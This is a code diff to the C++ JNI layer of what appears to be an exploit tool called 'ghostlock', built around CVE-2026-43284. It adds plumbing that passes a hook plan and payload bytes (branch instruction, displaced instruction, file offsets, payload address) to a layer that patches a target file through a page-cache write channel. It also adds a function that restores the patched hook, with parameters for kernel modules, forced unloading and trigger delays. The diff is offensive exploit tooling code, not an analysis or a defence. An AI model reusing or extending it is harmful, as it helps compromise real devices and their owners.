@@ -26,6 +26,7 @@
 #include <sys/socket.h>
 #include <unistd.h>
 #include <string>
+#include <utility>
 
 #include "backend/cve_2026_43284/embed/libcxx_blob.hpp"
 #include "backend/cve_2026_43284/embed/splicehelper_blob.hpp"
@@ -82,10 +83,15 @@ namespace ghostlock::jni {
             return false;
         }
 
+        /**
+         *  计划整份交给调用方：前四个字是写层要的，其余字段是同一张计划的其余事实（guard/displaced/
+         *  载荷范围/槽位），恢复层要把它们原样送回 steps::restore_hook。
+         *
+         *  @param out 收计划与载荷；失败时不改它。
+         *  @return 载荷建不出来 ⇒ false（上层给 hook-refused）。
+         */
         bool device_hook_plan(const Init43284Values &, const HookPlanRequest43284Values &,
-                            std::uint64_t &branch_word, std::uint64_t &displaced_word,
-                            std::uint64_t &site_offset, std::uint64_t &landing_offset,
-                            std::span<const std::byte> &payload, void *) noexcept {
+                              HookPlanOut43284 &out, void *) noexcept {
             using namespace ghostlock::backend::cve_2026_43284;
             const hook::SentryPlan plan = hook::device_sentry_plan();
             std::uint32_t branch = 0U;
@@ -98,12 +104,21 @@ namespace ghostlock::jni {
                 return false;
             }
             g_payload_size = size;
-            branch_word = branch;
-            displaced_word = plan.displaced_instruction;
-            site_offset = plan.hook_file_offset;
-            landing_offset = plan.payload_file_offset;
-            payload = std::span<const std::byte>(reinterpret_cast<const std::byte *>(g_payload),
-                                                 g_payload_size);
+            HookPlanOut43284 filled{};
+            filled.branch_word = branch;
+            filled.displaced_word = plan.displaced_instruction;
+            filled.site_offset = plan.hook_file_offset;
+            filled.landing_offset = plan.payload_file_offset;
+            filled.hook_vaddr = plan.hook_vaddr;
+            filled.guard_instruction = plan.guard_instruction;
+            filled.payload_file_offset = plan.payload_file_offset;
+            filled.payload_vaddr = plan.payload_vaddr;
+            filled.payload_max_bytes = plan.payload_max_bytes;
+            filled.entry_offset = plan.entry_offset;
+            filled.displaced_offset = plan.displaced_offset;
+            filled.payload.assign(reinterpret_cast<const std::uint8_t *>(g_payload),
+                                  reinterpret_cast<const std::uint8_t *>(g_payload) + g_payload_size);
+            out = std::move(filled);
             return true;
         }
         /**
@@ -1261,6 +1276,141 @@ namespace ghostlock::jni {
         GL_LOGI("hook write -> %d refusal=%s", hook_wrote ? 1 : 0,
                 refusal != nullptr ? refusal : "(null)");
         return hook_wrote;
+    }
+
+    namespace {
+        /**
+         *  DTO → SentryPlan：逐字段搬运，不做判断（判断在 steps::restore_hook 里）。
+         *
+         *  @param values Kotlin 侧装配的 plan（与 hookPlan 同源）
+         *  @return 同一张计划的 native 形状
+         */
+        backend::cve_2026_43284::hook::SentryPlan sentry_plan_of(
+                const contract::HookPlan43284Values &values) noexcept {
+            backend::cve_2026_43284::hook::SentryPlan plan{};
+            plan.hook_file_offset = static_cast<std::uint64_t>(values.hookPlanFileOffset);
+            plan.hook_vaddr = static_cast<std::uint64_t>(values.hookPlanVaddr);
+            plan.guard_instruction = static_cast<std::uint32_t>(values.hookPlanGuardInstruction);
+            plan.displaced_instruction = static_cast<std::uint32_t>(values.hookPlanDisplacedInstruction);
+            plan.payload_file_offset = static_cast<std::uint64_t>(values.hookPlanPayloadFileOffset);
+            plan.payload_vaddr = static_cast<std::uint64_t>(values.hookPlanPayloadVaddr);
+            plan.payload_max_bytes = static_cast<std::uint64_t>(values.hookPlanPayloadMaxBytes);
+            plan.entry_offset = static_cast<std::size_t>(values.hookPlanEntryOffset);
+            plan.displaced_offset = static_cast<std::size_t>(values.hookPlanDisplacedOffset);
+            return plan;
+        }
+
+        /**
+         *  Kotlin 的写面参数 → AccessParams，字段口径与 device_write_hook 的内联那段逐项相同
+         *  （access 的读/写要求 usable_for_access：sa.set + 路径成对 + offset_set）。
+         *
+         *  @note 现存两处（write_image / write_hook）保持内联不动：它们在本轮修复的攻击路径上，
+         *        合并成同一份属于单独的机械改动，不在本批。
+         */
+        void fill_access_params(const contract::AccessParams43284Values &params_values,
+                                const Init43284Values &sa_source,
+                                backend::cve_2026_43284::AccessParams &params) noexcept {
+            auto text_of = [](const std::vector<std::uint8_t> &bytes) {
+                return std::string(reinterpret_cast<const char *>(bytes.data()), bytes.size());
+            };
+            const std::string carrier = text_of(params_values.accessCarrierPath);
+            const std::string dev_carrier = text_of(params_values.accessDevCarrierPath);
+            const std::string patch_target = text_of(params_values.accessPatchTargetPath);
+            params.carrier = access_path_of(carrier);
+            params.dev_carrier = access_path_of(dev_carrier);
+            params.patch_target = access_path_of(patch_target);
+            params.carrier_base = static_cast<std::uint64_t>(params_values.accessCarrierBase);
+            params.offset = static_cast<std::uint64_t>(params_values.accessOffset);
+            params.offset_set = params_values.accessOffsetSet;
+            params.sa = sa_material_of(sa_source);
+            const std::string hook_image = text_of(params_values.accessHookImagePath);
+            const std::string kernel_release_text = text_of(params_values.accessKernelRelease);
+            const std::string success_marker_text = text_of(params_values.accessSuccessMarkerPath);
+            const std::string failure_marker_text = text_of(params_values.accessFailureMarkerPath);
+            const std::string in_flight_marker_text = text_of(params_values.accessInFlightMarkerPath);
+            const std::string module_marker_text = text_of(params_values.accessModuleMarkerPath);
+            params.hook_image = access_path_of(hook_image);
+            params.kernel_release = access_path_of(kernel_release_text);
+            params.success_marker = access_path_of(success_marker_text);
+            params.failure_marker = access_path_of(failure_marker_text);
+            params.in_flight_marker = access_path_of(in_flight_marker_text);
+            params.module_marker = access_path_of(module_marker_text);
+            params.kernel_preempt = params_values.accessKernelPreempt;
+            params.kernel_modversions = params_values.accessKernelModversions;
+            params.kernel_module_force_unload = params_values.accessKernelModuleForceUnload;
+            params.trigger_delay_ms = static_cast<std::uint32_t>(params_values.accessTriggerDelayMs);
+            params.wait_ms = static_cast<std::uint32_t>(params_values.accessWaitMs);
+        }
+    }  // namespace
+
+    /**
+     *  恢复钩子：驱动器终点那条 cleanup 的恢复段（参照 ghostlock-app-ref@5f184760 的
+     *  steps/chain.cpp:355 与同树 steps/hook_patch.cpp:193-225，先整块写回、再回读）。
+     *
+     *  @param values 写面：access 票据、块宽
+     *  @param params_values 同一份 AccessParams（借用式路径只在本栈帧内有效）
+     *  @param plan_values 恢复要的 plan（站点偏移、guard、displaced）
+     *  @param sa_source 会话材料
+     *  @param why 失败时收 steps 层的具名原因
+     *  @return 块写回并回读一致 true
+     *  @note 面无从 Kotlin 传：access 票据就是那张拼接面，通道与写钩子同一处（HookRequest 默认
+     *        PageCache）；序号由该 access 自己的窗口接续，不在这里重置。
+     */
+    bool device_restore_hook(const contract::WriteHook43284Values &values,
+                             const contract::AccessParams43284Values &params_values,
+                             const contract::HookPlan43284Values &plan_values,
+                             const Init43284Values &sa_source,
+                             const char **why) noexcept {
+        if (why != nullptr) {
+            *why = nullptr;
+        }
+        const std::uint64_t access_id = static_cast<std::uint64_t>(values.hookAccessId);
+        if (access_id == 0U) {
+            if (why != nullptr) {
+                *why = "restore:no-access-handle";
+            }
+            return false;
+        }
+        const std::size_t slot = static_cast<std::size_t>(access_id) - 1U;
+        if (slot >= kMaxAccesses || g_accesses[slot] == nullptr) {
+            if (why != nullptr) {
+                *why = "restore:stale-access-handle";
+            }
+            return false;
+        }
+        backend::cve_2026_43284::AccessParams access_params{};
+        fill_access_params(params_values, sa_source, access_params);
+        const backend::cve_2026_43284::hook::SentryPlan plan = sentry_plan_of(plan_values);
+        backend::cve_2026_43284::steps::HookRequest request{};
+        request.access = g_accesses[slot].get();
+        request.params = &access_params;
+        request.plan = &plan;
+        request.width = static_cast<std::size_t>(values.hookWidth);
+        /* 同一次运行的那张面（写钩子时的 face 日志与此处同源）：access → landing → surface。 */
+        {
+            const std::size_t landing_slot_now = g_access_landing[slot];
+            const Surface *const surface_now =
+                (landing_slot_now != 0U && landing_slot_now - 1U < kMaxSurfaces)
+                    ? g_surfaces[landing_slot_now - 1U].get() : nullptr;
+            GL_LOGI("restore hook face: access=%llu slot=%zu landing_slot=%zu remote=%d door_slot=%zu file_fd=%d width=%zu",
+                    static_cast<unsigned long long>(access_id), slot, landing_slot_now,
+                    (surface_now != nullptr && surface_now->target_remote) ? 1 : 0,
+                    surface_now != nullptr ? surface_now->door_slot : 0U,
+                    (surface_now != nullptr && surface_now->door_slot < kMaxDoors)
+                        ? g_doors[surface_now->door_slot].fd : -1,
+                    request.width);
+        }
+        const char *refusal = nullptr;
+        const bool restored = backend::cve_2026_43284::steps::restore_hook(plan, request, &refusal);
+        GL_LOGI("restore_hook: site_file=0x%llx guard=0x%08x displaced=0x%08x restored=%d refusal=%s",
+                static_cast<unsigned long long>(plan.hook_file_offset),
+                static_cast<unsigned>(plan.guard_instruction),
+                static_cast<unsigned>(plan.displaced_instruction), restored ? 1 : 0,
+                refusal != nullptr ? refusal : "(null)");
+        if (!restored && why != nullptr) {
+            *why = refusal != nullptr ? refusal : "step-restore-refused";
+        }
+        return restored;
     }
 
 }  // namespace ghostlock::jni
